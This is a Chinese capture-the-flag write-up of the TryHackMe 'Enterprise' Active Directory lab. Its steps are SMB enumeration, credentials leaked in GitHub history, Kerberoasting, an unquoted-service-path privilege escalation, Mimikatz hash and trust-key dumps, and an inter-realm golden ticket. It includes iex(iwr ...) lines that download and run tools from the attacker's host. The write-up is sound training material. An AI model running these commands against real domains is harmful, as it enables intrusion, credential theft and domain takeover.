# 服务探测

端口探测
```
root@ip-10-10-208-107:~# nmap -p- 10.10.59.205 --open

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-04 02:48 GMT
Nmap scan report for ip-10-10-248-133.eu-west-1.compute.internal (10.10.59.205)
Host is up (0.0039s latency).
Not shown: 61918 closed ports, 3588 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
7990/tcp  open  unknown
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown

```

服务探测
```
root@ip-10-10-208-107:~# nmap -sV -Pn 10.10.59.205 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,7990,9389,47001,49664-49673

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-04 02:57 GMT
Nmap scan report for ip-10-10-248-133.eu-west-1.compute.internal (10.10.59.205)
Host is up (0.00075s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS
80/tcp    open   http          Microsoft IIS httpd 10.0
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-04 02:57:49Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
5357/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7990/tcp  open   http          Microsoft IIS httpd 10.0
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp closed unknown
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open   msrpc         Microsoft Windows RPC
49672/tcp closed unknown
49673/tcp open   msrpc         Microsoft Windows RPC
MAC Address: 02:CC:01:6E:8F:D9 (Unknown)
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.08 seconds

```


## smb

枚举分项目录
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# crackmapexec smb 10.10.59.205 -u '' -p '' --shares
SMB         10.10.59.205   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.10.59.205   445    LAB-DC           [-] LAB.ENTERPRISE.THM\: STATUS_ACCESS_DENIED 
SMB         10.10.59.205   445    LAB-DC           [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

```

不允许匿名登录，但是得到了
域的名称：LAB.ENTERPRISE.THM 
DC服务器的名字： LAB-DC

用smbclient再次枚举，这次出现了分享的目录
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# smbclient --no-pass -L //10.10.59.205

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.59.205 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

### Users
可以登录
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# smbclient --no-pass //10.10.59.205/Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Mar 11 21:11:49 2021
  ..                                 DR        0  Thu Mar 11 21:11:49 2021
  Administrator                       D        0  Thu Mar 11 16:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
  Default                           DHR        0  Thu Mar 11 19:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
  Public                             DR        0  Thu Mar 11 16:27:02 2021

                15587583 blocks of size 4096. 9920786 blocks available

```

整理一个user list
```
Administrator
atlbitbucket
bitbucket
LAB-ADMIN
```

尝试枚举上面用户是否关闭了kerberos预认证

找到一个用户凭据文件
```
smb: \LAB-ADMIN\AppData\Local\Microsoft\Credentials\> ls
  .                                 DSn        0  Thu Mar 11 19:28:46 2021
  ..                                DSn        0  Thu Mar 11 19:28:46 2021
  DFBE70A7E5CC19A398EBF1B96859CE5D   AHSn    11152  Thu Mar 11 18:09:04 2021

                15587583 blocks of size 4096. 9919566 blocks available
```

这个查了一下是RDP登录凭证，但是查了一下好像没有办法破解


### Docs
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# smbclient --no-pass //10.10.59.205/Docs
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 14 22:47:35 2021
  ..                                  D        0  Sun Mar 14 22:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Sun Mar 14 22:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Sun Mar 14 22:45:24 2021

```

有两个office文件，但是收到了密码保护，使用这个[office2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)转成可以被john识别的哈希值，使用john破解，但是没有任何结果



## http

80端口没有任何有用的东西

7990也是一个http端口，看上去跑了一个叫ATLASSIAN 的web app，但其实只是一个静态页面

登录框写了一行字：
> Reminder to all Enterprise-THM Employees:We are moving to Github!


在谷歌上搜索```enterprise-thm github```找到了[这个github页面](https://github.com/Enterprise-THM)

只有一个About-US的project

维护者是一个叫```Nik-enterprise-dev```的人，点进个人主页，还维护了[一个powershell项目](https://github.com/Nik-enterprise-dev/mgmtScript.ps1)
只有一个脚本
```
Import-Module ActiveDirectory
$userName = ''
$userPassword = ''
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

用户名和密码都为空

点击这个脚本的history页面，找到最初版本，记录了用户名和密码
```
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

现在有了一个用户凭据
```
nik:ToastyBoi!
```


## find SPN
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# python3 /opt/impacket/examples/GetUserSPNs.py  -dc-ip 10.10.59.205 lab.enterprise.thm/nik:ToastyBoi!  -request -outputfile hash.txt                                                                                               130 ⨯
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158   
```


得到一个用户的SPN,用john破解
```
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# cat hash.txt 
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$d286d86f986ebc5ed08752398bfa566a$878cf038efff7b158da57d8e041a07b03e4194ac25e7348658120d4bb26b762213465f35bb7b065aa5bbb321607d8d32a7044473170be71cddeb9df93a404ec3e45ac782c3f603a64b47d890deec82e96e2f20c15f3a55c5017ccb80544f41af572083863551d85a7d24c08700914cd170294f7c295b5312fa5e9ded3605705fe55d8acc0937f7268e4fef90254823400931c454833bc2acf4d319f67f336fb4984aeb6a51543336bb5fc68c43a7546b93b44abc518878b34b476545935a82630e5ded8cd7b201aff3da2f2e9015a5b679d6a39a0a419883169dd9b943ed9452c287b7778f7e367ffaa153e6238cf3b964a3842c7a82037cd0805c7b0df82e354588bfc8f256a02a91d70c03b58a564fbb04577b45670d7e5ec3b919244bc71df6afb7aa4ac7471f59e1c6e572dc28fb0fc142dd9d5b60e132e2c1820282b2c70e189af31484705d427bacfc89080a7738c6018a594eb9ac34140d0a8bdd625a5edf25caf543880203ec1779543ca06911a8375339b50ee3438126d894b1a7c15fa5d772bc2dcec1134399ccbfe98f07ea62ebd1d3970524b07be6d8f2bebb9be1470f2472bfe57656622b2767a045dbfe575a90bb25546ebd34e000d2175d107a0421c9a8a1968bee1c3736b3d35100f3edab7ecc4efb1b2ae185832d97e7c02b54a9e61c05875c72a2a21f0f94fef0a0ad35f7e77b2134605a56df3613061f4f3f25a43e3c185a861d1af30d2e4451cfe7fcc15a6aafb963160d941e286366f695f44cab437e83b85bbe06f0601fdd3fc686108b14bb33b91f1fb0ad9fb88e460ef7cfe59f729b18f84226977f58f8fa35eb6f66ce9dda6188b64e23f27f73a206b8640b46132bc73b1efb47c8bf9788010f26c2a9f70581488896a729c814763e7d69bfdcb26675da14c9dc27b99ea412cb07d6030d0d6b2fa57fa71aa8d6530c98741dd16722ee29e77e3f5635db125ee79df40d3df607bc6fc2217cfe6e08c4c6e545c3597f526f9efd1aecf4869cab95eb61c3c627edefb0c8661d081d2b704502f7d6ca8ab4c8df6134accaef9e8e8a3d5eeb54e3054e54eca1991db472ff9e4371301c8a59cff106c343d064d789d409b7f69ce96b8e8091c323ed9edd09beda75555d866b71a6e10d7eef8406ea47aaa77b040f06ad9e688deef6942e2076e285b02ce67104d816f9dfe323b348d97d2790ac12545e7b5fc4a92ba7da5fcab00e47146111bd0cff0c925f33674ffbf972522d295b08ec1eb07c206590634bcfa000d32d4b63296e864606282307059645816bd50c5d12d5c63e671f062f84b5e7c6efacef5d940f75cc9a149801ffe5f49f068f8d62eebabcd2cb1a604b72
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Enterprise]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littleredbucket  (?)     
1g 0:00:00:01 DONE (2022-03-04 00:56) 0.8620g/s 1354Kp/s 1354Kc/s 1354KC/s livelife93..liss27
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

账号：bitbucket
密码：littleredbucket


使用下面命令rdp连接靶机
```
xfreerdp /f /u:bitbucket /p:littleredbucket /v:10.10.59.205 /size:1280x1030
```

桌面找到用户flag

# 本地权限提升

在kali起一个简易http服务器，通过http把枚举和提权工具传到靶机
```
iex (iwr http://10.11.63.196/PowerView.ps1 -UseBasicParsing)

iex (iwr http://10.11.63.196/SharpHound.ps1 -UseBasicParsing)

iex (iwr http://10.11.63.196/Invoke-Mimikatz.ps1  -UseBasicParsing)

iex (iwr http://10.11.63.196/PowerUp.ps1  -UseBasicParsing)
```

枚举所有域用户
```
PS C:\Users\bitbucket> get-netuser|select cn

cn
--
Administrator
Guest
atlbitbucket
krbtgt
BitBucker
nik
REPLICATION
spooks
Korone
Banana
Cake
Contractor
Varg
Joiner
```


枚举所有DA用户
```
PS C:\Users\bitbucket\Desktop> Get-NetGroupMember -GroupName "Domain Admins" -Recurse |select MemberName

MemberName
----------
joiner
Cake
korone
Administrator
```

使用SharpHound手机域信息
```
Invoke-BloodHound -CollectionMethod All -verbose
```

如何把文件从靶机传回kali，这里使用smb，因为我们有了bitbucket的登录凭证，可以放到users的bitbucket下，然后使用smb下载




使用PowerUp，发现存在一个unquoted service paths的服务
```
[*] Checking for unquoted service paths...


ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True

ServiceName    : zerotieroneservice
Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>
CanRestart     : True
```


经过简单测试，发现可以在```C:\Program Files (x86)\Zero Tier\```写入文件，并且对这个服务有重启的权限

用Write-ServiceBinary方法，写一个Zero.exe
```
PS C:\Program Files (x86)\Zero Tier> Write-ServiceBinary -Name 'zerotieroneservice' -Path 'C:\Program Files (x86)\Zero Tier\Zero.exe'

ServiceName        Path                                      Command
-----------        ----                                      -------
zerotieroneservice C:\Program Files (x86)\Zero Tier\Zero.exe net user john Password123! /add && timeout /t 5 && net localgroup Administrators john /add
```
这一步主要是创建了一个叫```john```的用户，密码是```Password123!```，并且把john加入到本地管理员组


已存在在目标目录
```
PS C:\Program Files (x86)\Zero Tier> ls


    Directory: C:\Program Files (x86)\Zero Tier


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/14/2021   6:08 PM                Zero Tier One
-a----         3/4/2022  12:58 AM              6 1.txt
-a----         3/4/2022   1:01 AM          22016 Zero.exe
```

重启服务
```
PS C:\Program Files (x86)\Zero Tier> sc.exe stop zerotieroneservice
[SC] ControlService FAILED 1062:

The service has not been started.

PS C:\Program Files (x86)\Zero Tier> sc.exe start zerotieroneservice

SERVICE_NAME: zerotieroneservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5348
        FLAGS              :
```

现在，在桌面已管理员权限开启一个shell，输入用户凭据：```john:Password123!```

成功开启一个管理员权限的shell
```
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ============================================
lab-enterprise\john S-1-5-21-2168718921-3906202695-65158103-1120


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```
可以看到已经存在在```BUILTIN\Administrators```用户组

拿到root.txt
```
PS C:\users\Administrator\Desktop> type .\root.txt
THM{1a1fa948754212963...}
```


# 跨域（没有成功）

枚举所有信任关系
```
PS C:\users\bitbucket\Desktop> Get-NetForestDomain -Verbose | Get-NetDomainTrust

SourceName         TargetName       TrustType TrustDirection
----------         ----------       --------- --------------
LAB.ENTERPRISE.THM ENTERPRISE.THM ParentChild  Bidirectional
LAB.ENTERPRISE.THM morimori.com      Kerberos       Outbound
```

发现跟父域是双向信任的

使用Mimikatz导出所有NTML哈希
```
PS C:\users\Administrator\Desktop> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : LAB-ENTERPRISE / S-1-5-21-2168718921-3906202695-65158103

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 8537943ee84c50d9d4035c519ce2cb68

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 43c1c941c7f0eb3a74d8864ab7dfa212

<skip>
```

以Administrator身份开启一个shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:LAB.ENTERPRISE.THM /ntlm:8537943ee84c50d9d4035c519ce2cb68 /run:powershell.exe"'
```

枚举DC服务器的所有信任关系
```
PS C:\Windows\system32> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName LAB-DC.LAB.ENTERPRISE.THM

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::trust /patch

Current domain: LAB.ENTERPRISE.THM (LAB-ENTERPRISE / S-1-5-21-2168718921-3906202695-65158103)

Domain: ENTERPRISE.THM (ENTERPRISE / S-1-5-21-1835041512-953509921-1126143443)
 [  In ] LAB.ENTERPRISE.THM -> ENTERPRISE.THM
    * 3/11/2021 4:30:39 PM - CLEAR   - b9 f4 a3 46 54 fe ad 6c 3d a6 0b 74 cd 56 49 ea 3c 2d c1 79 11 cd e0 6c ce d9 c8 6c fa 93 c8 8a b7 39 be a7 0d 25 01 6b 90 3b 0c ad 82 65 b8 ba 0c fc be 07 13 9b fd 39 89 09 8f 03 41 3e d3 4c 3f e6 ba 97 d1 37 47 7d 10 56 c6 0c ce 55 ba bf 7a 86 6d fd 90 e4 ca 8f 00 0d bc f4 8f d7 c2 23 e8 61 70 48 de a0 b1 14 2d 45 ce 67 3d 0b 2f 2d 07 fb 1e b8 84 b0 e3 e1 c7 25 64 f6 fe c5 f5 9a ba a5 bd 0d 3a 14 45 4f 01 ee 80 49 d3 14 a4 ab 76 7c 3b 59 ef a4 17 41 34 b1 c0 9d 9b 58 48 dd f9 03 7c 74 7e ed d6 6e 9a ba f3 d4 be e5 a1 fc 51 a1 a9 8e f8 d0 0b 9f f6 db a1 e9 de a7 7c 57 f2 00 3f a2 e2 35 6c 47 1d da 5f 5d 48 db 6f 61 3c 41 61 23 c7 65 ce f5 6e 78 d2 25 21 40 8c 60 9f 0e 3f 46 7c 19 63 e7 8c 58 52 db 49 21 6b a6 d1 02 ac 6f a6 81 bd 1f be 6b e1 62 94 ec 3d 7c
        * aes256_hmac       eb0a1f52c2e7f30dbcf02a1737e2527da685a36d511e6b96da5d3517ba91a73c
        * aes128_hmac       7eed741499c0611a0275bfd2d83b0de1
        * rc4_hmac_nt       d84d2d46e70ebdcd94ec6f3c79f5731f

 [ Out ] ENTERPRISE.THM -> LAB.ENTERPRISE.THM
    * 3/11/2021 4:30:39 PM - CLEAR   - b9 f4 a3 46 54 fe ad 6c 3d a6 0b 74 cd 56 49 ea 3c 2d c1 79 11 cd e0 6c ce d9 c8 6c fa 93 c8 8a b7 39 be a7 0d 25 01 6b 90 3b 0c ad 82 65 b8 ba 0c fc be 07 13 9b fd 39 89 09 8f 03 41 3e d3 4c 3f e6 ba 97 d1 37 47 7d 10 56 c6 0c ce 55 ba bf 7a 86 6d fd 90 e4 ca 8f 00 0d bc f4 8f d7 c2 23 e8 61 70 48 de a0 b1 14 2d 45 ce 67 3d 0b 2f 2d 07 fb 1e b8 84 b0 e3 e1 c7 25 64 f6 fe c5 f5 9a ba a5 bd 0d 3a 14 45 4f 01 ee 80 49 d3 14 a4 ab 76 7c 3b 59 ef a4 17 41 34 b1 c0 9d 9b 58 48 dd f9 03 7c 74 7e ed d6 6e 9a ba f3 d4 be e5 a1 fc 51 a1 a9 8e f8 d0 0b 9f f6 db a1 e9 de a7 7c 57 f2 00 3f a2 e2 35 6c 47 1d da 5f 5d 48 db 6f 61 3c 41 61 23 c7 65 ce f5 6e 78 d2 25 21 40 8c 60 9f 0e 3f 46 7c 19 63 e7 8c 58 52 db 49 21 6b a6 d1 02 ac 6f a6 81 bd 1f be 6b e1 62 94 ec 3d 7c
        * aes256_hmac       643128314165f87c41041f07c13490fc0d96189f45c2eb3efcaa956707dd5a5e
        * aes128_hmac       3872b51d2e6716a863060cf1c00e4980
        * rc4_hmac_nt       d84d2d46e70ebdcd94ec6f3c79f5731f

 [ In-1] LAB.ENTERPRISE.THM -> ENTERPRISE.THM
    * 3/11/2021 4:30:39 PM - CLEAR   - b9 f4 a3 46 54 fe ad 6c 3d a6 0b 74 cd 56 49 ea 3c 2d c1 79 11 cd e0 6c ce d9 c8 6c fa 93 c8 8a b7 39 be a7 0d 25 01 6b 90 3b 0c ad 82 65 b8 ba 0c fc be 07 13 9b fd 39 89 09 8f 03 41 3e d3 4c 3f e6 ba 97 d1 37 47 7d 10 56 c6 0c ce 55 ba bf 7a 86 6d fd 90 e4 ca 8f 00 0d bc f4 8f d7 c2 23 e8 61 70 48 de a0 b1 14 2d 45 ce 67 3d 0b 2f 2d 07 fb 1e b8 84 b0 e3 e1 c7 25 64 f6 fe c5 f5 9a ba a5 bd 0d 3a 14 45 4f 01 ee 80 49 d3 14 a4 ab 76 7c 3b 59 ef a4 17 41 34 b1 c0 9d 9b 58 48 dd f9 03 7c 74 7e ed d6 6e 9a ba f3 d4 be e5 a1 fc 51 a1 a9 8e f8 d0 0b 9f f6 db a1 e9 de a7 7c 57 f2 00 3f a2 e2 35 6c 47 1d da 5f 5d 48 db 6f 61 3c 41 61 23 c7 65 ce f5 6e 78 d2 25 21 40 8c 60 9f 0e 3f 46 7c 19 63 e7 8c 58 52 db 49 21 6b a6 d1 02 ac 6f a6 81 bd 1f be 6b e1 62 94 ec 3d 7c
        * aes256_hmac       eb0a1f52c2e7f30dbcf02a1737e2527da685a36d511e6b96da5d3517ba91a73c
        * aes128_hmac       7eed741499c0611a0275bfd2d83b0de1
        * rc4_hmac_nt       d84d2d46e70ebdcd94ec6f3c79f5731f

 [Out-1] ENTERPRISE.THM -> LAB.ENTERPRISE.THM
    * 3/11/2021 4:30:39 PM - CLEAR   - b9 f4 a3 46 54 fe ad 6c 3d a6 0b 74 cd 56 49 ea 3c 2d c1 79 11 cd e0 6c ce d9 c8 6c fa 93 c8 8a b7 39 be a7 0d 25 01 6b 90 3b 0c ad 82 65 b8 ba 0c fc be 07 13 9b fd 39 89 09 8f 03 41 3e d3 4c 3f e6 ba 97 d1 37 47 7d 10 56 c6 0c ce 55 ba bf 7a 86 6d fd 90 e4 ca 8f 00 0d bc f4 8f d7 c2 23 e8 61 70 48 de a0 b1 14 2d 45 ce 67 3d 0b 2f 2d 07 fb 1e b8 84 b0 e3 e1 c7 25 64 f6 fe c5 f5 9a ba a5 bd 0d 3a 14 45 4f 01 ee 80 49 d3 14 a4 ab 76 7c 3b 59 ef a4 17 41 34 b1 c0 9d 9b 58 48 dd f9 03 7c 74 7e ed d6 6e 9a ba f3 d4 be e5 a1 fc 51 a1 a9 8e f8 d0 0b 9f f6 db a1 e9 de a7 7c 57 f2 00 3f a2 e2 35 6c 47 1d da 5f 5d 48 db 6f 61 3c 41 61 23 c7 65 ce f5 6e 78 d2 25 21 40 8c 60 9f 0e 3f 46 7c 19 63 e7 8c 58 52 db 49 21 6b a6 d1 02 ac 6f a6 81 bd 1f be 6b e1 62 94 ec 3d 7c
        * aes256_hmac       643128314165f87c41041f07c13490fc0d96189f45c2eb3efcaa956707dd5a5e
        * aes128_hmac       3872b51d2e6716a863060cf1c00e4980
        * rc4_hmac_nt       d84d2d46e70ebdcd94ec6f3c79f5731f


Domain: MORIMORI.COM (morimori.comERROR kull_m_string_displaySID ; ConvertSidToStringSid (0x00000057)
)
 [  In ] LAB.ENTERPRISE.THM -> MORIMORI.COM

 [ Out ] MORIMORI.COM -> LAB.ENTERPRISE.THM
    * 3/11/2021 7:30:30 PM - CLEAR   - 50 00 61 00 73 00 73 00 77 00 6f 00 72 00 64 00
        * aes256_hmac       a80d035b0775088e8ec1836d43f8b32f4cafca1f31f7c46f1615651dd140f382
        * aes128_hmac       10aac1e975ebdd4edb90692ebb2db502
        * rc4_hmac_nt       a4f49c406510bdcab6824ee7c30fd852

 [ In-1] LAB.ENTERPRISE.THM -> MORIMORI.COM

 [Out-1] MORIMORI.COM -> LAB.ENTERPRISE.THM
    * 3/11/2021 7:30:30 PM - CLEAR   - 50 00 61 00 73 00 73 00 77 00 6f 00 72 00 64 00
        * aes256_hmac       a80d035b0775088e8ec1836d43f8b32f4cafca1f31f7c46f1615651dd140f382
        * aes128_hmac       10aac1e975ebdd4edb90692ebb2db502
        * rc4_hmac_nt       a4f49c406510bdcab6824ee7c30fd852
```


伪造一条到父域```ENTERPRISE.THM```的TGT

从上面信息我们得知，父域的SID是：```S-1-5-21-1835041512-953509921-1126143443```

这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
```* rc4_hmac_nt       d84d2d46e70ebdcd94ec6f3c79f5731f```这个值


伪造TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:LAB.ENTERPRISE.THM /sid:S-1-5-21-2168718921-3906202695-65158103 /sids:S-1-5-21-1835041512-953509921-1126143443-519 /rc4:d84d2d46e70ebdcd94ec6f3c79f5731f /service:krbtgt /target:ENTERPRISE.THM /ticket:C:\users\bitbucket\Desktop\trust_tkt.kirbi"'
```

执行
```
PS C:\users\Administrator\Desktop> Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:LAB.ENTERPRISE.THM /sid:S-1-5-21-2168718921-3906202695-65158103 /sids:S-1-5-21-1835041512-953509921-1126143443-519 /rc4:d84d2d46e70ebdcd94ec6f3c79f5731f /service:krbtgt /target:ENTERPRISE.THM /ticket:C:\users\bitbucket\Desktop\trust_tkt.kirbi"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # Kerberos::golden /user:Administrator /domain:LAB.ENTERPRISE.THM /sid:S-1-5-21-2168718921-3906202695-65158103 /sids:S-1-5-21-1835041512-953509921-1126143443-519 /rc4:d84d2d46e70ebdcd94ec6f3c79f5731f /service:krbtgt /target:ENTERPRISE.THM /ticket:C:\users\bitbucket\Desktop\trust_tkt.kirbi
User      : Administrator
Domain    : LAB.ENTERPRISE.THM (LAB)
SID       : S-1-5-21-2168718921-3906202695-65158103
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1835041512-953509921-1126143443-519 ;
ServiceKey: d84d2d46e70ebdcd94ec6f3c79f5731f - rc4_hmac_nt
Service   : krbtgt
Target    : ENTERPRISE.THM
Lifetime  : 3/4/2022 1:37:00 AM ; 3/1/2032 1:37:00 AM ; 3/1/2032 1:37:00 AM
-> Ticket : C:\users\bitbucket\Desktop\trust_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```


查看当前林
```
